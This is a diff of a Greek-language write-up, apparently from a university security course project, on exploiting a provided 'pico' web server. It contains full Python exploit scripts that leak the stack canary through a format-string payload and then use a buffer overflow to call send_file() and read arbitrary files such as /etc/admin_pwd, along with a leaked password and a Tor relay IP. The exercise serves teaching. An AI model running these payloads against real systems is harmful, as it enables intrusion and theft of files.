@@ -350,7 +350,7 @@
    το σύστημα στο οποίο έγινε. 
    
    Διαβάζοντας το Makefile είδαμε ότι δε γίνεται κάποια απενεργοποίηση των **stack-protectors (canaries)**, του **ASLR** και ενεργοποίηση του 
-   **Executable Stack** οπότε καταλάβαμε ότι θα ήταν ενεργοποιημένα.
+   **Executable Stack** οπότε καταλάβαμε ότι θα ήταν ενεργοποιημένα. [<sup>\[7\]</sup>](#7--httpsenwikipediaorgwikiStack_buffer_overflowProtection_schemes)
    
    - Mέσω του gdb επιβεβαιώσαμε ότι χρησιμοποιούνται **canaries** για να διασφαλιστούν οι συναρτήσεις που περιέχουν πίνακες και μάλιστα 
      χρησιμοποιούνται ***Random Terminator Canaries*** που προσφέρουν μεγαλύτερη ασφάλεια όταν γίνεται χρήση κάποιας `strcpy()`.
@@ -380,7 +380,7 @@
 <br/>
 
 6. Στην αρχή προσπαθήσαμε να βρούμε τρόπο να παρακάμψουμε τα ***canaries***. \
-   Σκεφτήκαμε ότι στην έκδοση gcc-5.4 υπάρχουν γνωστά vulnerabilities που θα μπορούσαμε να εκμεταλλευτούμε. [<sup>\[7\]</sup>](#7--httpswwwcvedetailscomvulnerability-listvendor_id-72product_id-960version_id-219995gnu-gcc-54html) \
+   Σκεφτήκαμε ότι στην έκδοση gcc-5.4 υπάρχουν γνωστά vulnerabilities που θα μπορούσαμε να εκμεταλλευτούμε. [<sup>\[8\]</sup>](#8--httpswwwcvedetailscomvulnerability-listvendor_id-72product_id-960version_id-219995gnu-gcc-54html) \
    Βρήκαμε ότι όντως υπάρχει ένα security vulnerability το οποίο θα μας επέτρεπε να περάσουμε τον έλεγχο του stack guard canary.
    
    |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/18-GCC_5.4_Security_Vulnerability.png)|
@@ -389,7 +389,7 @@
 
 7. Στη συνέχεια σκεφτήκαμε πως εφόσον βρισκόμαστε σε **x32** αρχιτεκτονική τότε θα μπορούσαμε να κάνουμε _brute force_ ώστε να βρούμε την τιμή 
    του και να την επαναφέρουμε μέσω του BOF για να μην προκύψει ***stack smashing***, κάτι που ενισχύεται δεδομένου ότι έχουμε να κάνουμε με 
-   **Termiantor Canaries** (eg. 0xYYYYYY**00**), που σημαίνει ότι μειώνεται ακόμα περισσότερο ο χώρος αναζήτησης του _brute forcing_ [<sup>\[8\]</sup>](#8--httpsctf101orgbinary-exploitationstack-canariesbruteforcing-a-stack-canary)
+   **Termiantor Canaries** (eg. 0xYYYYYY**00**), που σημαίνει ότι μειώνεται ακόμα περισσότερο ο χώρος αναζήτησης του _brute forcing_ [<sup>\[9\]</sup>](#9--httpsctf101orgbinary-exploitationstack-canariesbruteforcing-a-stack-canary)
    
    Έτσι κάνοντας brute force byte per byte, θα χρειαζόμασταν το πολύ 3\*255 = **765** προσπάθεις, κάτι που είναι αποδεκτό για ένα τέτοιο attack.
 <br/>
@@ -398,25 +398,25 @@
    ή κάνοντας brute force.
    
    Μέσω του gdb και μετά από σχετική αναζήτηση, βρήκαμε ότι τα συγκεκριμένα canaries είναι **Random Terminator Canaries** και έτσι καταλάβαμε το
-   πως λειτουργούν και πως θα μπορούσαμε να τα κάνουμε bypass. [<sup>\[9\]</sup>](#9--httpsenwikipediaorgwikiBuffer_overflow_protectioncanaries)[<sup>\[10\]</sup>](#10--httpswwwusenixorglegacypublicationslibraryproceedingssec98full_paperscowancowanpdf)[<sup>\[11\]</sup>](#11--httpstaffustceducnbjhuacoursessecurity2014readingsstackguard-bypasspdf)[<sup>\[12\]</sup>](#12--httpsuafioexploitation20150929Stack-CANARY-Overwrite-Primerhtml)
-   
+   πως λειτουργούν και πως θα μπορούσαμε να τα κάνουμε bypass. [<sup>\[10\]</sup>](#10--httpsenwikipediaorgwikiBuffer_overflow_protectioncanaries)[<sup>\[11\]</sup>](#11--httpswwwusenixorglegacypublicationslibraryproceedingssec98full_paperscowancowanpdf)[<sup>\[12\]</sup>](#12--httpstaffustceducnbjhuacoursessecurity2014readingsstackguard-bypasspdf)[<sup>\[13\]</sup>](#13--httpsuafioexploitation20150929Stack-CANARY-Overwrite-Primerhtml)[<sup>\[14\]</sup>](#14--httpswwwblackhatcompresentationsbh-usa-04bh-us-04-silbermanbh-us-04-silberman-paperpdfpage6)
+
    Βρήκαμε δηλαδή ότι παράγονται κατά το initialization του server και παραμένει ίδιο για κάθε κλήση συνάρτησης που περιέχει κάποιον πίνακα.
-   
+
    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/19-Random_Terminator_Canaries.png)
-   
+
    Αυτό άμεσα δηλώνει ότι μπορούμε να κάνουμε leak την τιμή του canary της **`check_auth()`** μέσω του **FSA** που μπορούμε να κάνουμε εκεί και να το 
    χρησιμοποιήσουμε για να "επαναφέρουμε" την τιμή του canary της **`post_param()`**.
-   
+
    Έτσι, διαβάζοντας την assembly μέσω του gdb βρήκαμε ότι το canary αποθηκεύεται στη θέση **$ebp - 0xC**. 
-   
+
    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/20-Stored_Canary.png)
-   
+
    Γι'αυτό έπρεπε να υπολογίσουμε το **offset** από τη μεταβλητή ***auth_username*** η οποία χρησιμοποιείται για το **FSA**. \
    Αρχικά, βρήκαμε το offset μεταξύ του **ορίσματος** της `printf()` και του **ebp** της `check_auth()`, που είναι ίσο με: **0x78 = 30\*4 = 120 bytes**. \
-   Αρα, ξέραμε άμεσα ότι το canary βρίσκεται **0xC** bytes πιο χαμηλά από τον ebp, αρα είχαμε το offset ίσο με: **0x6C = 27\*4 = 108 bytes = **.
-   
+   Αρα, ξέραμε άμεσα ότι το canary βρίσκεται **0xC** bytes πιο χαμηλά από τον ebp, αρα είχαμε το offset ίσο με: **0x6C = 27\*4 = 108 bytes**.
+
    Έτσι, κάνοντας αρχικά ένα request οπως αυτό του Part_2 με payload: **%27$x** παίρνουμε την τιμή του canary!
-   
+
    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/21-Canary_Value.png)
 
 <br/>
@@ -487,6 +487,10 @@
       response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
 
       print(response.text)
+      
+      # ------------------------------------------------------
+      # Run: python3 bof.py <port>
+      # eg.: python3 bof.py 8000
       ```
 
       </p>
@@ -578,6 +582,10 @@
        response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
  
        print(response.text)
+
+      # ------------------------------------------------------
+      # Run: python3 bof.py <port>
+      # eg.: python3 bof.py 8000
        ```
  
        </p>
@@ -589,6 +597,261 @@
     
     &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/25-Ultimate_Data.png)
 
+---
+---
+
+## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 4 (Code of Plan Z)
+
+1. Αρχικά είδαμε μέσα στο _ultimate.html_ που πήραμε από το ποηγούμενο βήμα, ότι γίνεται αναφορά σε κάποιο **z.log**, άρα έπρεπε να 
+   πάρουμε το περιεχόμενο του για το τελευταίο βήμα.
+
+2. Έτσι, σκεφτήκαμε να κάνουμε στοχευμένη κλήση της **`send_file()`** με όρισμα το **z.log**, ωστε να μας το στείλει όπως στάλθηκε το _ultimate.html_.
+
+   Πρώτα υπολογίσαμε τα καινούργια offsets. Βρήκαμε την απόσταση της πρώτης εντολής της **`send_file()`** από το return address της 
+   `check_auth()` για να την καλέσουμε δίνοντας τα δικά μας ορίσματα και αλλάζοντας τη διεύθυνση επιστροφής της σε κάποια safe διεύθυνση 
+   ώστε να απφύγουμε το segmentation fault. Επίσης, τοποθετούσαμε το string που θα έπαιρνε σαν όρισμα η `send_file()` στην αρχή του πίνακα 
+   **char post_data[100]**. 
+   
+   Παρόλο που μετά την ολοκλήρωση της `post_param()` το stack frame της θα "χανόταν", μαζί και ο τοπικός της πίνακας τα δεδομένα θα παρέμεναν 
+   στην ίδια θέση και θα ήταν προσβάσιμα από το πρόγραμμα, όπως και διαπιστώσαμε μέσω του gdb, ενώ παράλληλα με την κλήση της `send_file()` 
+   ξαναμπαίνουν αυτά τα δεδομένα στο ενεργό stack frame της. Έτσι, παρόλο που αυτές οι θέσεις θα ξαναχρησιμοποιηθούν από τη `send_file()`, είναι 
+   αρκετά χαμηλά και δεν προλαβαίνουν να γίνουν overwrite και καλείται η `fopen()` κανονικά.
+   
+   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
+   |-|-|
+   |1η εντολή της `send_file()` | **0x656** |
+   |Επιστροφή της `send_file()` σε safe address | **0x169**|
+   |Αρχή του πίνακα `post_data` σε σχέση με τον **ebp** της route | **0x110**|
+   
+   ```python
+   ...
+   binary_payload = BytesIO()
+   binary_payload.write(("p" * 100).encode("utf-8"))
+   binary_payload.write(canary)
+   binary_payload.write(("p" * 8).encode("utf-8"))
+   binary_payload.write(svd_ebp)
+   binary_payload.write(srv_ulti)
+   binary_payload.write(safe_ret)
+   ...
+   ```
+   <details>
+   <summary><b>Click here to see the full script</b></summary>
+      <p>
+
+      ```python
+      import pycurl
+      import struct
+      import base64
+      import requests
+
+      from sys import argv
+      from io  import BytesIO
+
+      # Sending 1st payload to / for getting the canary value and
+      # the return address of check_auth() from reposnse headers
+      url = 'http://localhost:' + argv[1] + '/'
+
+      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
+      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
+      response = requests.request("GET", url, headers=input_headers)
+      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+
+      # Building the payload
+      canary   = text_obj[-3]
+      ebp      = text_obj[-2]
+      ret_addr = text_obj[-1]
+
+      offset_srv_ulti = 0x870
+      offset_safe_ret = 0x169 
+
+      canary   = struct.pack('<L', int(canary  , base=16))
+      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
+      srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
+      safe_ret = struct.pack('<L', int(ret_addr, base=16) + offset_safe_ret)
+
+      binary_payload = BytesIO()
+      binary_payload.write(("p" * 100).encode("utf-8"))
+      binary_payload.write(canary)
+      binary_payload.write(("p" * 8).encode("utf-8"))
+      binary_payload.write(svd_ebp)
+      binary_payload.write(srv_ulti)
+      binary_payload.write(safe_ret)
+
+      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
+      url = 'http://localhost:' + argv[1] + '/ultimate.html'
+      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
+      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
+      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
+
+      print(response.text)
+      
+      # ------------------------------------------------------
+      # Run: python3 bof.py <port> <file_to_retrieve>
+      # eg.: python3 bof.py 8000 /var/log/z.log
+      ```
+       
+      </p>
+   </details><br/>
+    
+3. Ωστόσο, συνειδητοποίησαμε μετά από χρήση πολλών μεθόδων πραγματοποιήσης των requests (postman, curl, python libraries), ότι δεν μπορούσαν να 
+   σταλθούν τα δεδομένα που θέλαμε επειδή έλειπαν τα headers που πρέπει να λάβει πρώτα σαν απάντηση το κάθε request (eg. **HTTP/1.1 200 OK\r\n\r\n**).
+   
+   Παρόλ'αυτά, η πρώτη γραμμή κάθε αρχείου που ζητάγαμε να διαβάσουμε επέστρεφε μέσα στο exception που προκαλούσε η python.
+   
+   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/26-Request_Exception_Results.png)
+   
+   Θα μπορούσαμε λοιπόν, να φτιάξουμε ένα script που να κάνει πολλαπλά requests παίρνοντας γραμμή γραμμή κάθε αρχείο, κάτι που βέβαια θα ήταν ιδιαίτερα
+   αντιπαραγωγικό.
+   <br/>
+    
+4. Έτσι, έπρεπε να βρούμε έναν τρόπο να στείλουμε πρώτα αυτά τα headers για να εγκαθιδρυθεί η σύνδεση και να μπορέσει να στείλει και τα υπόλοιπα δεδομένα.
+   
+   Για να το πετύχουμε αυτό, χρησιμοποιήσαμε το attack που κάναμε στο προηγούμενο part. Κάναμε αρχικά return στην `serve_ultimate()`, η οποία στέλνει τα 
+   headers by default και μαζί στέλενει και το _ultimate.html_ και ακολούθως, αντί να επιστρέψουμε στην εντολή αμέσως μετά το `free()` όπως πριν, επιστρέφαμε
+   στη **`send_file()`**, για 2<sup>η</sup> φορά πλέον, δίνοντας το δικό μας εκάστοτε όρισμα.
+   
+   Κάνοντας το όμως τοποθετώντας το string που θα έπαιρνε σαν είσοδο η `send_file()` στον πίνακα **post_data**, η κλήση της `serve_ultimate()` και η αποστολή 
+   του _ultimate.html_ κάνει overwrite το όρισμά μας και τελικά αποτυγχάνει το attack.
+   
+   Έτσι, έπρεπε να βρούμε έναν άλλον πίνακα ή κάποιες θέσεις μνήμης για να γράψουμε το argument της `send_file()`. Βρήκαμε τελικά ότι ακριβώς πριν την κλήση 
+   της **`post_param()`** δηλώνεται ένας πίνακας **100** θέσεων στον οποίο θα μπορούσαμε να γράψουμε τα δεδομένα που θέλουμε. 
+   
+   Αυτός ο πίνακας τοποθετείται **0x70 = 112 bytes** κάτω από την αρχή του stack frame της `route()`, κάτι που σημαίνει ότι είναι αρκετά κοντά με την αρχή 
+   του stack frame της `post_param()`, καθώς αρχικοποιείται με **0x84 = 132 bytes**. Έτσι, εξασφαλίζουμε ότι δε θα επικαλυφθούν ιδιαίτερα σημαντικά δεδομένα 
+   της `route()` και θα μπορέσει μετά να συνεχιστεί η ομαλή εκτέλεσή της.
+   
+   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/27-Route_Stack_Frame_Size.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/28-Admin_pwd_Position.png)|
+   |-|-|
+   
+   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
+   |-|-|
+   |1η εντολή της `serve_ultimate()` | **0x870** |
+   |1η εντολή της `send_file()` | **0x656** |
+   |Επιστροφή της `send_file()` σε safe address | **0x169**|
+   |Θέση του argument για τη `send_file()` σε σχέση με τον **ebp** της route | **0x8C**|
+   
+   ```python
+   ...
+   binary_payload = BytesIO()
+   binary_payload.write(("p" * 100).encode("utf-8"))
+   binary_payload.write(canary)
+   binary_payload.write(("p" * 8).encode("utf-8"))
+   binary_payload.write(svd_ebp)
+   binary_payload.write(ulti_ret)
+   binary_payload.write(sndf_ret)
+   binary_payload.write(fin_ret)
+   binary_payload.write(argument)
+   binary_payload.write((argv[2] + "&").encode("utf-8"))
+   ...
+   ```
+   <details>
+   <summary><b>Click here to see the full script</b></summary>
+      <p>
+
+      ```python
+      import pycurl
+      import struct
+      import base64
+      import requests
+
+      from sys import argv
+      from io  import BytesIO
+
+      # Sending 1st payload to / for getting the canary value and
+      # the return address of check_auth() from reposnse headers
+      url = 'http://localhost:' + argv[1] + '/'
+
+      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
+      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
+      response = requests.request("GET", url, headers=input_headers)
+      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+
+      # Building the payload
+      canary   = text_obj[-3]
+      ebp      = text_obj[-2]
+      auth_ret = text_obj[-1]
+
+      offset_to_srv_ulti = 0x870
+      offset_to_send_fl  = 0x656
+      offset_to_fin_ret  = 0x169
+      offset_to_pdata    = 0x8C
+
+      canary   = struct.pack('<L', int(canary  , base=16))
+      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
+      fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)
+      sndf_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_send_fl)
+      ulti_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_srv_ulti)
+      argument = struct.pack('<L', int(ebp     , base=16) - offset_to_pdata)
+
+      binary_payload = BytesIO()
+      binary_payload.write(("p" * 100).encode("utf-8"))
+      binary_payload.write(canary)
+      binary_payload.write(("p" * 8).encode("utf-8"))
+      binary_payload.write(svd_ebp)
+      binary_payload.write(ulti_ret)
+      binary_payload.write(sndf_ret)
+      binary_payload.write(fin_ret)
+      binary_payload.write(argument)
+      binary_payload.write((argv[2] + "&").encode("utf-8"))
+
+      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
+      url = 'http://localhost:' + argv[1] + '/ultimate.html'
+      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
+      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
+      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
+
+      # Uncomment for removing ultimate.html from output
+      print(response.text)
+      # print(response.text[173:])
+      
+      # ------------------------------------------------------
+      # Run: python3 bof.py <port> <file_to_retrieve>
+      # eg.: python3 bof.py 8000 /var/log/z.log
+      ```
+       
+      </p>
+   </details><br/>
+   
+   Έτσι, πήραμε το περιεχόμενο του **z.log**!
+   
+   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/29-Z_Log_Data.png)
+
+<br/>
+
+5. Στη συνέχεια πήραμε τον κωδικό που είναι στο /etc/admin_pwd για να μπορούμε να μπαίνουμε και κανονικά στο ultimate.html μέσω browser.
+   
+   > Password: **kdje34123asdfasd23D**   
+<br/>
+
+6. Μέσα στο **z.log** βρήκαμε τις πληροφορίες που θα μας οδηγούσαν στον κωδικό του Plan_Z.
+
+   Το πρώτο κομμάτι του κωδικού το αποκρυπτογραφήσαμε εύκολα, βρίσκοντας πληροφορίες για ένα εξαιρετικά ιστορικό σκακιστικό παιχνίδι μεταξύ 
+   του **Garry Kasparov** και του **Deep Blue**. [<sup>\[15\]</sup>](#15--httpsenwikipediaorgwikideep_blue_versus_garry_kasparovgame_6_2)[<sup>\[16\]</sup>](#16--httpwwwkasparovcomtimeline-eventdeep-blue)
+   
+   Έτσι η κίνηση που έπρεπε να βρούμε ήταν η εκείνη που έκανε τον Kasparov να παραιτηθεί από την παρτίδα και να δώσει τη νίκη στον Deep Blue.
+   
+   Εν προκειμένω πρόκειται για την κίνηση **c4**.
+   
+   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/30-Kasparov_vs_Deep_Blue_Mov18.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/31-Kasparov_vs_Deep_Blue_Mov19.png)|
+   |-|-|
+    
+<br/>
+
+7. Έμενε πλέον να βρούμε την Public IP του μηχανήματος στο οποίο τρέχει ο pico server.
+   
+   Αρχικά, αναζητούσαμε επιθέσεις όπως **SSL Certificates Attack**. [<sup>\[17\]</sup>](#17--httpswwwnetsparkercomblogweb-securityexposing-public-ips-tor-services-through-ssl-certificates)[<sup>\[18\]</sup>](#18--httpswwwbleepingcomputercomnewssecuritypublic-ip-addresses-of-tor-sites-exposed-via-ssl-certificates) 
+   Ωστόσο, σύντομα είδαμε ότι δεν θα αποδώσει ο τρόπος αυτός κάποιο αποτέλεσμα και ξαναγυρίσαμε στην ιδέα κάποιου πιο advanced **BOF**.
+   
+   Πρώτα, κάναμε retrieve πάρα πολλά αρχεία του συστήματος με το attack του προηγούμενου βήματος, όπως αρχεία του **`/proc/net/`** directory, μήπως και βρισκόταν
+   κάπου εκεί η Public IP του μηχανήματος.
+   
+   Το σημαντικότερο από αυτά που βρήκαμε ήταν η IP του Guard Relay του server στο Tor: **153.92.127.239:443** _(Netherlands)_
+   
+<br/>
+
+8. Στη συνέχεια λοιπόν, σκεφτήκαμε να κάνουμε το **Return to Libc Attack**.
+   
+   
 
    
    
@@ -601,9 +864,16 @@
 <h5><sup>[4]</sup>  https://stackoverflow.com/questions/6916805/why-does-a-base64-encoded-string-have-an-sign-at-the-end</h5>
 <h5><sup>[5]</sup>  https://owasp.org/www-community/attacks/Format_string_attack</h5>
 <h5><sup>[6]</sup>  https://cs155.stanford.edu/papers/formatstring-1.2.pdf#page=11</h5>
-<h5><sup>[7]</sup>  https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-960/version_id-219995/GNU-GCC-5.4.html</h5>
-<h5><sup>[8]</sup>  https://ctf101.org/binary-exploitation/stack-canaries/#bruteforcing-a-stack-canary</h5>
-<h5><sup>[9]</sup>  https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries</h5>
-<h5><sup>[10]</sup>  https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf</h5>
-<h5><sup>[11]</sup>  http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf</h5>
-<h5><sup>[12]</sup>  https://uaf.io/exploitation/2015/09/29/Stack-CANARY-Overwrite-Primer.html</h5>
+<h5><sup>[7]</sup>  https://en.wikipedia.org/wiki/Stack_buffer_overflow#Protection_schemes</h5>
+<h5><sup>[8]</sup>  https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-960/version_id-219995/GNU-GCC-5.4.html</h5>
+<h5><sup>[9]</sup>  https://ctf101.org/binary-exploitation/stack-canaries/#bruteforcing-a-stack-canary</h5>
+<h5><sup>[10]</sup>  https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries</h5>
+<h5><sup>[11]</sup>  https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf</h5>
+<h5><sup>[12]</sup>  http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf</h5>
+<h5><sup>[13]</sup>  https://uaf.io/exploitation/2015/09/29/Stack-CANARY-Overwrite-Primer.html</h5>
+<h5><sup>[14]</sup>  https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf#page=6</h5>
+<h5><sup>[15]</sup>  https://en.wikipedia.org/wiki/Deep_Blue_versus_Garry_Kasparov#Game_6_2</h5>
+<h5><sup>[16]</sup>  http://www.kasparov.com/timeline-event/deep-blue/</h5>
+<h5><sup>[17]</sup>  https://www.netsparker.com/blog/web-security/exposing-public-ips-tor-services-through-ssl-certificates/</h5>
+<h5><sup>[18]</sup>  https://www.bleepingcomputer.com/news/security/public-ip-addresses-of-tor-sites-exposed-via-ssl-certificates/</h5>
+
